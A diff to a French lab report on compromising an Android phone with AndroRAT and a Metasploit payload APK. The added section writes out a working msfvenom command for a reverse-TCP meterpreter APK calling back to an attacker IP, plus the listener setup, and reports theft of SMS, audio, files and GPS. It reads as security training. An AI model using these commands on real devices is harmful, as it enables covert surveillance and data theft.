@@ -1,4 +1,4 @@
-# Rapport d'Attaque avec AndroRAT
+# Attaques sur Android
 
 ## 📌 Informations Générales
 - **Date de l'attaque** : 23/01/2025
@@ -9,11 +9,13 @@
 - **Adresse IP de la victime** : 192.168.232.2
 
 ---
+---
+# I. Rapport d'Attaque avec AndroRAT
 
 ## 🎯 Objectif de l'attaque
 L'objectif de cette attaque était de tester la compromission d'un appareil Android à l'aide de **AndroRAT**, un Remote Access Trojan (RAT) permettant d'obtenir un contrôle total sur l'appareil cible.
 
----
+
 
 ## 🛠️ Méthodologie
 ### 1️⃣ Génération de l'APK Malveillant
@@ -71,9 +73,44 @@ getLocation
 - Récupération des coordonnées GPS en temps réel.
 
 ![sms](location.png)
+
+---
 ---
 
-## 📝 Résultats de l'Attaque
+# II. Rapport d'Attaque via Metasploit (Payload APK)
+## 🎯 Objectif de l'attaque
+L'objectif de cette attaque était de tester la compromission d'un appareil Android à l'aide d'un payload APK malveillant généré et exploité via **Metasploit Framework**, permettant d'obtenir un contrôle distant sur l'appareil cible.
+
+
+## 🛠️ Méthodologie
+### 1️⃣ Génération de l'APK Malveillant
+Commande utilisée pour générer le payload :
+```
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.3.219.27 LPORT=4445 R > payload.apk
+```
+- **LHOST** : Adresse IP de l'attaquant.
+- **LPORT** : Port d'écoute sur la machine attaquante.
+
+### 2️⃣ Installation et Exécution de l'APK
+- L'APK a été transféré et installé sur le téléphone cible via un serveur HTTP local.
+- Une fois lancée, l'application a établi une connexion avec la machine attaquante.
+
+### 3️⃣ Configuration de Metasploit pour la Connexion
+Commande utilisée pour configurer l'écouteur :
+```
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.3.219.27
+set LPORT 4445
+exploit
+```
+Une session **meterpreter** a été ouverte avec succès une fois que l'APK a été exécuté.
+
+![sms](metasploit.png)
+---
+
+## 📝 Résultats des Attaques
 | Fonctionnalité | Résultat |
 |--------------|---------|
 | Accès aux SMS | ✅ Succès |
@@ -81,15 +118,6 @@ getLocation
 | Enregistrement audio | ✅ Succès (Fichier audio enregistré) |
 | Accès aux fichiers | ✅ Succès (Exploration et extraction) |
 | Géolocalisation | ✅ Succès (Coordonnées GPS obtenues) |
-
----
-
-## 🔍 Analyse des Vulnérabilités Exploitées
-1. **Installation d'une application non vérifiée** : L'utilisateur a installé un APK sans contrôle de source.
-2. **Manque de protection des permissions** : L’application malveillante a pu accéder librement aux fonctionnalités sensibles.
-3. **Absence d’un antivirus** : Aucun mécanisme de détection n’a empêché l’exécution de l’APK.
-
----
 ## 🔐 Recommandations de Sécurité
 - **Ne pas installer d’APK provenant de sources inconnues.**
 - **Restreindre les permissions des applications non fiables.**
@@ -100,6 +128,6 @@ getLocation
 ---
 
 ## 📌 Conclusion
-L'utilisation de **AndroRAT** a permis de démontrer la facilité avec laquelle un appareil Android peut être compromis si l'utilisateur ne suit pas les bonnes pratiques de sécurité. Ce test souligne l'importance d'une sensibilisation accrue aux cybermenaces sur mobile.
+Ces différentes attaques ont permis de démontrer la facilité avec laquelle un appareil Android peut être compromis si l'utilisateur ne suit pas les bonnes pratiques de sécurité. Ce test souligne l'importance d'une sensibilisation accrue aux cybermenaces sur mobile.
 
 
